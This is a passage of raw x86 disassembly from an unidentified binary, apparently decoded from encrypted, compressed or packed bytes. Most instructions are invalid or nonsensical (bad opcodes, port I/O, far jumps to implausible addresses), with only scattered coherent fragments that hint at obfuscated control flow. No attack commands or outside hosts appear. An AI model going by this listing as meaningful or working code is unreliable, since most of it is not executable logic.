  4125a9:	shl    ebp,1
  4125ab:	into   
  4125ac:	(bad)  
  4125ae:	mov    bl,0x5f
  4125b0:	fstp   QWORD PTR [ecx-0x29]
  4125b3:	or     esp,edx
  4125b5:	mov    edi,0xc0345a12
  4125ba:	mov    ah,0x43
  4125bc:	int    0x15
  4125be:	imul   esp,DWORD PTR [ecx-0x28aa615b],0xa9b1730c
  4125c8:	xchg   esi,eax
  4125c9:	jbe    0x412621
  4125cb:	jecxz  0x41256a
  4125cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ce:	mov    BYTE PTR [esp+ebp*8-0x1b],cl
  4125d2:	cs mov ebp,0xbb8a93a9
  4125d8:	loopne 0x4125e9
  4125da:	in     eax,dx
  4125db:	cmp    cl,BYTE PTR [ecx+esi*1]
  4125de:	jg     0x412655
  4125e0:	outs   dx,DWORD PTR ds:[esi]
  4125e1:	mov    esp,0x326cd1cb
  4125e6:	popa   
  4125e7:	sahf   
  4125e8:	adc    al,BYTE PTR [edx+0x18a23bb9]
  4125ee:	dec    ecx
  4125ef:	sub    al,0x4
  4125f1:	inc    ebp
  4125f2:	(bad)  
  4125f3:	pop    edi
  4125f4:	lea    eax,[edi+0x2ae5f01f]
  4125fa:	push   es
  4125fb:	adc    ebp,0xf
  4125fe:	mov    eax,0x70ec2c9a
  412603:	(bad)  
  412605:	sub    eax,0xc1b8a192
  41260a:	xchg   BYTE PTR [edx+0x60],ch
  41260d:	jo     0x412602
  41260f:	mov    BYTE PTR [ebx+0x5d],0x75
  412613:	aam    0x81
  412615:	mov    ds:0x9f07718b,eax
  41261a:	ja     0x412690
  41261c:	fwait
  41261d:	test   DWORD PTR [ecx],ebp
  41261f:	jge    0x4125f8
  412621:	push   ss
  412622:	(bad)
  412626:	ds pusha 
  412628:	sahf   
  412629:	js     0x41263d
  41262b:	mov    dl,0x30
  41262d:	cmp    DWORD PTR [ebx+ebp*1+0x657d8e1a],ebp
  412634:	pop    ebp
  412635:	inc    esi
  412636:	int    0x5e
  412638:	jae    0x412685
  41263a:	pusha  
  41263b:	xchg   esp,eax
  41263c:	inc    esp
  41263d:	or     al,0x73
  41263f:	(bad)  
  412640:	loop   0x412677
  412642:	ja     0x4125da
  412644:	mov    dl,0x4e
  412646:	test   al,0x1
  412648:	jb     0x41262b
  41264a:	pop    edx
  41264b:	(bad)  
  41264c:	push   ds
  41264d:	and    ch,al
  41264f:	lods   eax,DWORD PTR ds:[esi]
  412650:	xchg   esp,eax
  412651:	or     BYTE PTR [eax+0x4e],bl
  412654:	cmp    DWORD PTR [esi-0x6b],ebp
  412657:	sti    
  412658:	in     eax,dx
  412659:	mov    ds:0xc6503f6c,al
  41265e:	pop    edi
  41265f:	(bad)  
  412661:	ret    
  412662:	jae    0x412606
  412664:	shl    DWORD PTR [edx+0x67aa6431],cl
  41266a:	pop    ss
  41266b:	pop    esp
  41266c:	imul   bh
  41266e:	jl     0x4125f0
  412670:	mov    ch,0xb6
  412672:	repz dec eax
  412674:	dec    ebp
  412675:	mov    al,0x14
  412677:	sbb    eax,eax
  412679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267a:	cmp    DWORD PTR [esi-0x47],ebx
  41267d:	loopne 0x41262f
  41267f:	test   al,0x1b
  412681:	ds add al,0x71
  412684:	or     eax,0x13537679
  412689:	repz fstp DWORD PTR [esi-0x73]
  41268d:	mov    fs:0xee03e965,al
  412693:	mov    bh,0x42
  412695:	push   edi
  412696:	jg     0x4126d1
  412698:	pop    edx
  412699:	call   0x64f4c2c5
  41269e:	push   0xffffffa4
  4126a0:	lahf   
  4126a1:	pop    esp
  4126a2:	loope  0x41271f
  4126a4:	cmp    ebp,ebp
  4126a6:	lods   eax,DWORD PTR ds:[esi]
  4126a7:	sahf   
  4126a8:	fs or  al,0xd0
  4126ab:	inc    ebx
  4126ac:	pop    esi
  4126ad:	jae    0x412705
  4126af:	cmc    
  4126b0:	(bad)  
  4126b1:	test   al,0x9b
  4126b3:	fs ins BYTE PTR es:[edi],dx
  4126b5:	sbb    bl,al
  4126b7:	cmp    eax,0xd304bd78
  4126bc:	lods   al,BYTE PTR ds:[esi]
  4126bd:	inc    ebx
  4126be:	daa    
  4126bf:	ror    BYTE PTR [esp+ebp*4-0x25],cl
  4126c3:	imul   esp,DWORD PTR [edi+0x4b648874],0x3c02bdc3
  4126cd:	mov    edx,0x77bc04c0
  4126d2:	cmp    eax,0x1e1f2e3b
  4126d7:	aas    
  4126d8:	stos   DWORD PTR es:[edi],eax
  4126d9:	or     DWORD PTR [edi],edi
  4126db:	push   ebp
  4126dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126dd:	mov    eax,cs:0xcfd0c270
  4126e3:	jns    0x41274f
  4126e5:	jmp    0x3c2387ec
  4126ea:	pop    es
  4126eb:	(bad)  
  4126ec:	fld    DWORD PTR [ebx-0x61b79d7f]
  4126f2:	fisttp WORD PTR [eax+eiz*1+0x4de2fc3b]
  4126f9:	add    DWORD PTR [edi-0x45],0xbe578676
  412700:	loopne 0x412716
  412702:	cmp    DWORD PTR [eax+0x66],ecx
  412705:	mov    ds:0xa40b9c59,eax
  41270a:	dec    esi
  41270b:	add    eax,0x493afb1d
  412710:	add    bl,BYTE PTR [esi+0x70]
  412713:	xor    eax,0xe6149eb4
  412718:	call   0x5f38:0xb5f6b440
  41271f:	in     eax,0x32
  412721:	xchg   edi,eax
  412722:	jl     0x4126b2
  412724:	pusha  
  412725:	or     BYTE PTR [edx+0x35],0xc
  412729:	jae    0x412744
  41272b:	lahf   
  41272c:	mov    ebp,0x3f63db02
  412731:	aam    0x36
  412733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412734:	cld    
  412735:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	test   eax,0xaa36c1a2
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	loopne 0x412742
  412762:	repz sbb dh,BYTE PTR [ebx+eax*2]
  412766:	ret    0xccbf
  412769:	rcr    BYTE PTR [esi],cl
  41276b:	in     al,dx
  41276c:	rol    DWORD PTR [ebx+0x7f],1
  41276f:	out    0x5b,al
  412771:	mov    ebp,0xac985686
  412776:	adc    ch,BYTE PTR [ebp-0xf]
  412779:	ins    BYTE PTR es:[edi],dx
  41277a:	cmp    ebx,ebp
  41277c:	inc    ebp
  41277d:	das    
  41277e:	xchg   DWORD PTR [ecx],ebp
  412780:	sbb    bh,BYTE PTR [edi-0x12]
  412783:	into   
  412784:	sbb    DWORD PTR [eax-0x65],edi
  412787:	inc    eax
  412788:	mov    ebx,DWORD PTR [ebp-0x18297c30]
  41278e:	push   eax
  41278f:	and    ebx,DWORD PTR [ebx+0x5f92754c]
  412795:	stos   BYTE PTR es:[edi],al
  412796:	ret    0xae09
  412799:	sbb    esp,edi
  41279b:	mov    ecx,DWORD PTR [eax+0x167a81d2]
  4127a1:	cmp    al,0x71
  4127a3:	xchg   edi,eax
  4127a4:	inc    DWORD PTR [ebx-0x723f48f8]
  4127aa:	popa   
  4127ab:	ss arpl si,si
  4127ae:	dec    eax
  4127af:	add    eax,0x6966dfb6
  4127b4:	fist   WORD PTR [ecx+0x3c]
  4127b7:	dec    ebp
  4127b8:	xchg   ecx,eax
  4127b9:	pop    ecx
  4127ba:	ds int3 
  4127bc:	icebp  
  4127bd:	out    dx,eax
  4127be:	inc    edi
  4127bf:	sub    dl,al
  4127c1:	test   eax,0xaf1dd079
  4127c6:	fldenv [esi-0x1a]
  4127c9:	xlat   BYTE PTR ds:[ebx]
  4127ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127cb:	ins    DWORD PTR es:[edi],dx
  4127cc:	xchg   esi,eax
  4127cd:	xor    eax,0x3e734519
  4127d2:	or     eax,0x738a70c
  4127d7:	shr    BYTE PTR [esi+ebx*8],cl
  4127da:	sub    dl,ah
  4127dc:	jae    0x412802
  4127de:	es test al,0x66
  4127e1:	clc    
  4127e2:	cmp    ecx,DWORD PTR [ebp+ecx*4-0x72]
  4127e6:	mov    al,ds:0xcdbee1e8
  4127eb:	push   ebp
  4127ec:	mov    edi,0xe9a843eb
  4127f1:	jl     0x412858
  4127f3:	frstor [ebx-0x53]
  4127f6:	or     ch,BYTE PTR [ebp-0x6]
  4127f9:	xchg   esp,eax
  4127fa:	xchg   DWORD PTR [ecx+0x2b],ecx
  4127fd:	or     ebx,ebx
  4127ff:	add    eax,edx
  412801:	or     al,0xbc
  412803:	fidivr WORD PTR [ebp+edi*8+0x32]
  412807:	div    BYTE PTR [eax]
  412809:	dec    DWORD PTR [ebx+0xf]
  41280c:	mov    dl,0x5e
  41280e:	cli    
  41280f:	pushf  
  412810:	fcmovnbe st,st(4)
  412812:	mov    ebp,DWORD PTR [eiz*4+0x6005d13e]
  412819:	mov    ah,0xd1
  41281b:	add    edi,DWORD PTR [ebx]
  41281d:	or     al,0x11
  41281f:	mov    al,ds:0x6f43a872
  412824:	fbstp  TBYTE PTR [edi+ebp*8]
  412827:	inc    ebp
  412828:	out    dx,al
  412829:	popf   
  41282a:	fdiv   QWORD PTR [ecx+edi*4+0x1b245390]
  412831:	mov    dl,0x7c
  412833:	dec    ebp
  412834:	mov    edi,0x849d3394
  412839:	sub    ch,BYTE PTR [ebx+0x32]
  41283c:	repz lahf 
  41283e:	xlat   BYTE PTR ds:[ebx]
  41283f:	xchg   DWORD PTR [ebp+0x76],esp
  412842:	xor    DWORD PTR [ecx+0xd00100f],ebx
  412848:	ss push esp
  41284a:	cmp    al,al
  41284c:	jecxz  0x41284b
  41284e:	inc    DWORD PTR [ecx-0xd]
  412851:	mov    DWORD PTR [ecx],edi
  412853:	mov    esp,0x57335fd8
  412858:	enter  0xcbe9,0xf2
  41285c:	rcl    DWORD PTR [edx+0x7a425e82],cl
  412862:	in     al,dx
  412863:	orps   xmm2,XMMWORD PTR [esi-0x23]
  412867:	inc    eax
  412868:	daa    
  412869:	les    di,DWORD PTR [ebp-0x4]
  41286d:	sbb    cl,BYTE PTR [ebp-0x6]
  412870:	mov    dl,0xc2
  412872:	je     0x41288d
  412874:	sub    eax,0x91fa5263
  412879:	bound  ebp,QWORD PTR [eax-0x25]
  41287c:	js     0x4128e0
  41287e:	js     0x412848
  412880:	jle    0x4128a5
  412882:	sar    DWORD PTR [ebx+ebx*2-0x31],0x6
  412887:	sbb    al,BYTE PTR [ecx+ecx*2-0x4b6919da]
  41288e:	loope  0x412875
  412890:	push   eax
  412891:	sub    bl,BYTE PTR [edi+ebx*1+0x1fd83af6]
  412898:	or     dh,BYTE PTR [eax-0x50]
  41289b:	pop    edx
  41289c:	jle    0x41286a
  41289e:	loopne 0x41290c
  4128a0:	ret    0x677c
  4128a3:	cmp    bl,BYTE PTR [ecx-0x62]
  4128a6:	jnp    0x41283a
  4128a8:	cs nop
  4128aa:	pop    es
  4128ab:	mov    al,ds:0x96674033
  4128b0:	test   eax,0xef284c80
  4128b5:	sub    eax,0x31ffe1df
  4128ba:	(bad)  
  4128bb:	clc    
  4128bc:	in     eax,dx
  4128bd:	adc    eax,0x263a0f88
  4128c2:	in     al,dx
  4128c3:	pop    ds
  4128c4:	pusha  
  4128c5:	scas   eax,DWORD PTR es:[edi]
  4128c6:	inc    ebx
  4128c7:	cli    
  4128c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c9:	jne    0x4128db
  4128cb:	lods   al,BYTE PTR ds:[esi]
  4128cc:	mov    ebp,0xf87edddf
  4128d1:	arpl   WORD PTR [esi-0x32ed08ab],di
  4128d7:	xlat   BYTE PTR ds:[ebx]
  4128d8:	sub    BYTE PTR [ebp-0x7e],ch
  4128db:	push   esi
  4128dc:	xchg   esi,eax
  4128dd:	mov    WORD PTR [ecx],cs
  4128df:	adc    ebp,DWORD PTR [ebp+ebx*1+0x6bb2dbe3]
  4128e6:	or     eax,ebp
  4128e8:	out    0x4e,al
  4128ea:	push   cs
  4128eb:	mov    ?,WORD PTR [esi-0x70]
  4128ee:	int    0x49
  4128f0:	ja     0x412911
  4128f2:	push   ebp
  4128f3:	dec    eax
  4128f4:	dec    esi
  4128f5:	into   
  4128f6:	xor    bl,BYTE PTR [ecx]
  4128f8:	jnp    0x41287b
  4128fa:	nop
  4128fb:	(bad)  
  4128fc:	div    BYTE PTR [ecx+0x11]
  4128ff:	pop    esp
  412900:	icebp  
  412901:	ja     0x4128eb
  412903:	fild   DWORD PTR [ebp-0x9994e9a]
  412909:	retw   
  41290b:	fadd   st(0),st
  41290d:	in     eax,dx
  41290e:	inc    edi
  41290f:	dec    ecx
  412910:	push   edx
  412911:	in     eax,0x4c
  412913:	into   
  412914:	inc    edx
  412915:	xlat   BYTE PTR ds:[ebx]
  412916:	xchg   ecx,eax
  412917:	ss push esi
  412919:	adc    DWORD PTR [esi-0x7e],0x1767b543
  412920:	jmp    0xf0ed43dd
  412925:	sti    
  412926:	imul   DWORD PTR [esi]
  412928:	mov    ecx,0xbd49be3
  41292d:	sbb    eax,0x3ecd5c0a
  412932:	stos   DWORD PTR es:[edi],eax
  412933:	push   edi
  412934:	cwde   
  412935:	std    
  412936:	aaa    
  412937:	adc    al,cl
  412939:	int3   
  41293a:	fcomp  DWORD PTR [esi+0x14]
  41293d:	mov    ecx,0xffc7dc7f
  412942:	mov    ss,WORD PTR ds:0xb6be6a41
  412948:	dec    ebx
  412949:	(bad)  
  41294a:	xor    al,0xf9
  41294c:	mov    eax,0x600aa060
  412951:	enter  0x2518,0xf7
  412955:	nop
  412956:	push   ebp
  412957:	gs push esi
  412959:	and    bh,al
  41295b:	pop    es
  41295c:	sbb    DWORD PTR [esi],ecx
  41295e:	hlt    
  41295f:	call   0xaedc:0x44b359a7
  412966:	test   BYTE PTR [ecx],cl
  412968:	pop    esi
  412969:	mov    eax,ds:0xb1843a3d
  41296e:	push   ebp
  41296f:	jne    0x412967
  412971:	stos   DWORD PTR es:[edi],eax
  412972:	or     DWORD PTR [edx-0x67],0xffffffb7
  412976:	push   0xffffff8f
  412978:	pop    esi
  412979:	push   ss
  41297a:	cmp    BYTE PTR [esi-0x57],dl
  41297d:	nop
  41297e:	leave  
  41297f:	std    
  412980:	inc    esp
  412981:	mov    dh,0xa8
  412983:	mov    eax,ds:0xd86e9f60
  412988:	f2xm1  
  41298a:	dec    ebx
  41298b:	mov    dl,0x41
  41298d:	in     al,dx
  41298e:	test   dh,bh
  412990:	xor    DWORD PTR [ecx+0x5d9df5b4],0x2
  412997:	or     al,0x79
  412999:	mov    ebx,0x19010871
  41299e:	lock test al,0xb3
  4129a1:	jnp    0x4129cd
  4129a3:	ins    DWORD PTR es:[edi],dx
  4129a4:	aam    0x24
  4129a6:	mov    eax,ds:0xcc2ac4da
  4129ab:	xchg   ebp,eax
  4129ac:	xor    DWORD PTR [edx+0x13f502ab],ecx
  4129b2:	or     DWORD PTR [edi],ebp
  4129b4:	sbb    dh,BYTE PTR [esp+ebx*2]
  4129b7:	ror    DWORD PTR [edi+0x9],0xbb
  4129bb:	daa    
  4129bc:	loopne 0x412a02
  4129be:	ds popf 
  4129c0:	push   es
  4129c1:	sub    cl,BYTE PTR [eax]
  4129c3:	push   esp
  4129c4:	les    ebp,FWORD PTR ds:0x8549ead0
  4129ca:	mov    ds:0x33e8558b,eax
  4129cf:	rol    BYTE PTR [ebx],1
  4129d1:	shr    ecx,1
  4129d3:	cwde   
  4129d4:	sldt   WORD PTR [eax]
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a1a
  4129f1:	js     0x412a48
  4129f3:	jne    0x412a0c
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412987
  4129fd:	mov    ch,0xe9
  4129ff:	push   ss
  412a00:	inc    eax
  412a01:	dec    esi
  412a02:	jmp    0xcfea1ec
  412a07:	mov    edi,0x27b6e0e5
  412a0c:	test   al,0x8b
  412a0e:	inc    ebx
  412a0f:	sbb    eax,0x8293dd7
  412a14:	cmp    edi,ecx
  412a16:	xor    DWORD PTR [ecx-0x40441150],ebp
  412a1c:	retf   
  412a1d:	adc    dh,BYTE PTR [esi-0x39]
  412a20:	adc    BYTE PTR [ebp+0x3f],cl
  412a23:	ror    BYTE PTR [eax],0x24
  412a26:	mov    WORD PTR ds:0xdf1027f3,ss
  412a2c:	jge    0x412a04
  412a2e:	and    ecx,DWORD PTR [edi]
  412a30:	mov    ebp,DWORD PTR [esi]
  412a32:	loopne 0x4129b9
  412a34:	es ds xchg ecx,eax
  412a37:	sbb    ebx,edx
  412a39:	xchg   edx,eax
  412a3a:	and    eax,0xf2915c3
  412a3f:	sbb    al,0x6e
  412a41:	and    al,0x3a
  412a43:	dec    esi
  412a44:	pop    ss
  412a45:	mov    ds:0x6106809c,eax
  412a4a:	mov    cs,WORD PTR [esi-0x7a726ae1]
  412a50:	xchg   edi,eax
  412a51:	push   eax
  412a52:	and    al,0xae
  412a54:	push   ss
  412a55:	inc    dl
  412a57:	jns    0x412aa3
  412a59:	cmp    DWORD PTR [ebx-0x4f],ecx
  412a5c:	imul   esi,DWORD PTR [esi+0x33],0x5c
  412a60:	ficom  DWORD PTR [eax-0x7b]
  412a63:	dec    ebx
  412a64:	inc    edi
  412a65:	add    BYTE PTR [esi],ah
  412a67:	in     al,0xb1
  412a69:	sbb    BYTE PTR [ebp+0xc60eef7],0xd5
  412a70:	leave  
  412a71:	pop    ax
  412a73:	add    al,0xcc
  412a75:	adc    al,0x74
  412a77:	std    
  412a78:	adc    al,0xe0
  412a7a:	fcmovbe st,st(6)
  412a7c:	sbb    BYTE PTR [ecx],bh
  412a7e:	mov    es,WORD PTR [ecx+0x30806dba]
  412a84:	div    BYTE PTR [eax+0x29]
  412a87:	lods   eax,DWORD PTR ds:[esi]
  412a88:	loope  0x412a11
  412a8a:	and    esi,esi
  412a8c:	outs   dx,BYTE PTR ds:[esi]
  412a8d:	cld    
  412a8e:	xchg   DWORD PTR [esi],ebx
  412a90:	dec    ebx
  412a91:	push   ecx
  412a92:	ins    BYTE PTR es:[edi],dx
  412a93:	adc    dh,BYTE PTR ss:[edi+0x5d]
  412a97:	iret   
  412a98:	retf   
  412a99:	out    0x3c,al
  412a9b:	dec    ebx
  412a9c:	inc    ebx
  412a9d:	das    
  412a9e:	sbb    eax,0x8489f12a
  412aa3:	push   ds
  412aa4:	push   0x4df138d6
  412aa9:	push   ss
  412aaa:	lods   al,BYTE PTR ds:[esi]
  412aab:	out    0x9a,al
  412aad:	adc    esp,DWORD PTR [edx+eiz*4-0x570f255a]
  412ab4:	or     edx,DWORD PTR [edx+0x3d]
  412ab7:	imul   edi,DWORD PTR ds:0xf790c185,0xffffffd3
  412abe:	cmp    BYTE PTR [ebx+eax*1+0x40adb41c],dl
  412ac5:	or     eax,DWORD PTR [edx-0x6bdd618c]
  412acb:	mov    cl,0x2d
  412acd:	add    eax,0x9489a49c
  412ad2:	lahf   
  412ad3:	sbb    dl,al
  412ad5:	sar    BYTE PTR [esi-0x15],0xa5
  412ad9:	xchg   edi,eax
  412ada:	and    BYTE PTR [eax-0x7d4d6850],0x12
  412ae1:	xchg   BYTE PTR [edi+ecx*1],cl
  412ae4:	inc    edi
  412ae5:	sahf   
  412ae6:	cmp    DWORD PTR [eax-0x7faabe34],ebp
  412aec:	sbb    al,0xb4
  412aee:	nop
  412aef:	sub    dh,BYTE PTR ds:0x75fa19f4
  412af5:	fbstp  TBYTE PTR [esp+eax*2-0x4885d56b]
  412afc:	adc    al,0x19
  412afe:	(bad)  [ebp-0xd4e0e95]
  412b04:	pop    ecx
  412b05:	retf   
  412b06:	sbb    BYTE PTR [edi-0x2b],dh
  412b09:	add    eax,eax
  412b0b:	xchg   ebx,eax
  412b0c:	sahf   
  412b0d:	daa    
  412b0e:	cli    
  412b0f:	jg     0x412aaf
  412b11:	retf   0x37b8
  412b14:	pcmpeqd mm0,QWORD PTR [ecx]
  412b17:	cdq    
  412b18:	inc    eax
  412b19:	cmp    al,0x32
  412b1b:	and    al,0x38
  412b1d:	lahf   
  412b1e:	inc    eax
  412b1f:	cmp    ebp,0x6c
  412b22:	push   ds
  412b23:	pushf  
  412b24:	stos   DWORD PTR es:[edi],eax
  412b25:	jnp    0x412b73
  412b27:	(bad)  
  412b28:	gs shl dl,1
  412b2b:	mov    edi,0x2da69447
  412b30:	sbb    ch,BYTE PTR [eax+0x4d]
  412b33:	cvtps2pd xmm1,QWORD PTR [ecx]
  412b36:	popa   
  412b37:	iret   
  412b38:	xor    eax,0x4221e581
  412b3d:	pop    eax
  412b3e:	mov    fs,WORD PTR [edi+0x20ba0750]
  412b44:	sub    esi,DWORD PTR [ecx-0x29]
  412b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b48:	repz and al,0xfe
  412b4b:	sar    DWORD PTR [ebx],cl
  412b4d:	lds    ebx,FWORD PTR [ebx-0x69]
  412b50:	das    
  412b51:	fld    QWORD PTR [eax]
  412b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b54:	dec    esp
  412b55:	cmp    esp,0x1c
  412b58:	(bad)
  412b5b:	and    ebx,DWORD PTR [esi]
  412b5d:	jne    0x412af5
  412b5f:	outs   dx,DWORD PTR ds:[esi]
  412b60:	cmp    eax,0xbf1600eb
  412b65:	pop    esi
  412b66:	pop    ds
  412b67:	daa    
  412b68:	mov    ?,WORD PTR [edx+0x29fe06e1]
  412b6e:	les    ecx,FWORD PTR [ebx-0x334ccde4]
  412b74:	leave  
  412b75:	rol    DWORD PTR [eax],0x41
  412b78:	sub    DWORD PTR [edi],esi
  412b7a:	cmp    bh,bl
  412b7c:	add    esi,DWORD PTR [ebx-0x21474281]
  412b82:	fnsave [ebp+0x4e]
  412b85:	and    ebx,ebp
  412b87:	popf   
  412b88:	cli    
  412b89:	pop    es
  412b8a:	aaa    
  412b8b:	shl    DWORD PTR [edx-0x23],1
  412b8e:	adc    ecx,DWORD PTR [ebp-0x7c]
  412b91:	xchg   ebx,eax
  412b92:	popa   
  412b93:	int    0xd2
  412b95:	jmp    0x1eeb:0x7257fa5c
  412b9c:	add    esp,ebp
  412b9e:	push   ebx
  412b9f:	call   0xe1b3:0xc9cd8559
  412ba6:	xlat   BYTE PTR ds:[ebx]
  412ba7:	inc    edx
  412ba8:	imul   eax,edx,0x62abd3bc
  412bae:	jne    0x412bbc
  412bb0:	shl    DWORD PTR [edi],0x47
  412bb3:	inc    eax
  412bb4:	xor    BYTE PTR [esp+edx*8],ah
  412bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bb8:	test   DWORD PTR [eax-0x54],0xbfb7eb02
  412bbf:	jo     0x412bd9
  412bc1:	popa   
  412bc2:	push   cs
  412bc3:	nop
  412bc4:	es pop ebx
  412bc6:	test   al,0xad
  412bc8:	inc    eax
  412bc9:	lods   al,BYTE PTR ds:[esi]
  412bca:	icebp  
  412bcb:	bound  eax,QWORD PTR [ebx-0x39]
  412bce:	call   0x9a4ea32c
  412bd3:	cmp    BYTE PTR [edi],cl
  412bd5:	push   ds
  412bd6:	xchg   al,bh
  412bd8:	mov    fs,ebp
  412bda:	jb     0x412c10
  412bdc:	test   BYTE PTR [eax],0xe8
  412bdf:	and    esp,DWORD PTR [ebx+eax*2+0x1315224]
  412be6:	cld    
  412be7:	mov    ds:0x5c77bb32,eax
  412bec:	or     dl,dh
  412bee:	loopne 0x412bbd
  412bf0:	pusha  
  412bf1:	jmp    0x6b6b:0xf19bd188
  412bf8:	and    edx,esi
  412bfa:	lea    ebp,[edi-0x4]
  412bfd:	das    
  412bfe:	cmp    ecx,edx
  412c00:	sbb    eax,0x9271178e
  412c05:	add    bl,al
  412c07:	pop    ss
  412c08:	icebp  
  412c09:	pusha  
  412c0a:	mov    ecx,0xcb27da3e
  412c0f:	mov    ds:0x4c28c2dc,al
  412c14:	into   
  412c15:	jmp    0x412c10
  412c17:	push   ebp
  412c18:	lds    esp,FWORD PTR [ebp-0x5b36a7cc]
  412c1e:	cmp    esp,edx
  412c20:	sbb    eax,0xee14af6c
  412c25:	pop    ss
  412c26:	sub    ebx,esp
  412c28:	mov    dl,0xdc
  412c2a:	mov    bl,0xa2
  412c2c:	pop    ds
  412c2d:	xchg   edx,eax
  412c2e:	mov    cs,WORD PTR [eax+0x3fb1b6a7]
  412c34:	dec    ecx
  412c35:	js     0x412c91
  412c37:	lds    edx,FWORD PTR [edi+edi*8+0x30a52dfd]
  412c3e:	call   0x7f67:0xd3501a51
  412c45:	(bad)  
  412c46:	popa   
  412c47:	push   0x4dd5a1b9
  412c4c:	jo     0x412c75
  412c4e:	mov    esp,0x3d607978
  412c53:	aam    0x16
  412c55:	pop    esi
  412c56:	mov    edx,0x8e03420d
  412c5b:	mov    al,0xbb
  412c5d:	out    dx,eax
  412c5e:	xchg   ebp,eax
  412c5f:	jmp    0x412ca8
  412c61:	xor    eax,0x15f8e683
  412c66:	inc    edi
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   ecx,ebx
  412c83:	shl    BYTE PTR [ecx-0x3c],0xfc
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c24
  412c8f:	adc    bl,ch
  412c91:	scas   eax,DWORD PTR es:[edi]
  412c92:	cmp    DWORD PTR [edi-0x57],0x3a22be77
  412c99:	cmp    BYTE PTR [ebp-0x244efff],cl
  412c9f:	xor    ebx,DWORD PTR fs:[ecx+0x5305138a]
  412ca6:	pop    ebx
  412ca7:	test   al,0xef
  412ca9:	sub    DWORD PTR [ebp-0x20],eax
  412cac:	or     al,0x70
  412cae:	mov    ds:0x56b57942,eax
  412cb3:	pop    ebx
  412cb4:	pop    DWORD PTR ds:0x37b3b3cd
  412cba:	out    dx,eax
  412cbb:	jbe    0x412d13
  412cbd:	mov    esp,ss
  412cbf:	sbb    DWORD PTR [edx-0x4a7fcb7e],esp
  412cc5:	jae    0x412c67
  412cc7:	scas   eax,DWORD PTR es:[edi]
  412cc8:	adc    edi,edi
  412cca:	ins    BYTE PTR es:[edi],dx
  412ccb:	xor    BYTE PTR [ebx+0x48f42a83],0x4f
  412cd2:	ficomp DWORD PTR [eax+0x6b399491]
  412cd8:	mov    cs,eax
  412cda:	push   esp
  412cdb:	aad    0xba
  412cdd:	adc    dl,dl
  412cdf:	repz push ecx
  412ce1:	dec    esp
  412ce2:	(bad)  
  412ce3:	pop    ebx
  412ce4:	and    al,0x16
  412ce6:	sbb    esp,DWORD PTR [edi-0x4a]
  412ce9:	xchg   BYTE PTR ds:0xd694e64,al
  412cef:	xchg   ebx,eax
  412cf0:	popa   
  412cf1:	mov    ds:0xf269bd7,al
  412cf6:	addr16 inc eax
  412cf8:	lods   eax,DWORD PTR ds:[esi]
  412cf9:	retf   0x70dd
  412cfc:	arpl   WORD PTR [esi+0x29],bx
  412cff:	ret    
  412d00:	ss inc edi
  412d02:	dec    ebp
  412d03:	into   
  412d04:	xchg   ebp,eax
  412d05:	dec    ecx
  412d06:	test   al,0x3f
  412d08:	xchg   esp,eax
  412d09:	(bad)  
  412d0a:	std    
  412d0b:	outs   dx,BYTE PTR ds:[esi]
  412d0c:	and    DWORD PTR [edx],esi
  412d0e:	xchg   DWORD PTR [edi],ebx
  412d10:	out    dx,al
  412d11:	push   ds
  412d12:	xchg   ebp,eax
  412d13:	and    al,0x65
  412d15:	mov    ebp,0xabed4601
  412d1a:	out    dx,eax
  412d1b:	sar    ebp,1
  412d1d:	and    eax,0x93a08433
  412d22:	sub    eax,0x900f4b20
  412d27:	dec    edi
  412d28:	cwde   
  412d29:	lods   eax,DWORD PTR ds:[esi]
  412d2a:	xor    ebx,DWORD PTR [esi]
  412d2c:	cmp    BYTE PTR [esp+ecx*4],ch
  412d2f:	push   ss
  412d30:	inc    ebp
  412d31:	ret    
  412d32:	pusha  
  412d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d34:	and    eax,0xe19c073d
  412d39:	cmp    BYTE PTR [esi+0x7b],bh
  412d3c:	sub    eax,0x48027dd6
  412d41:	dec    ecx
  412d42:	and    bh,BYTE PTR ds:0x10906a54
  412d48:	push   ds
  412d49:	ins    BYTE PTR es:[edi],dx
  412d4a:	out    0x1c,al
  412d4c:	inc    ebx
  412d4d:	repnz out dx,eax
  412d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d50:	cmp    al,0xf3
  412d52:	mov    ebp,0xb8f5181
  412d57:	jmp    0xa3eb:0xd7d9fd1f
  412d5e:	adc    BYTE PTR [ebx+eax*1-0x57],ah
  412d62:	(bad)  
  412d63:	xchg   ecx,eax
  412d64:	cwde   
  412d65:	cmc    
  412d66:	push   ebp
  412d67:	enter  0xac81,0x5a
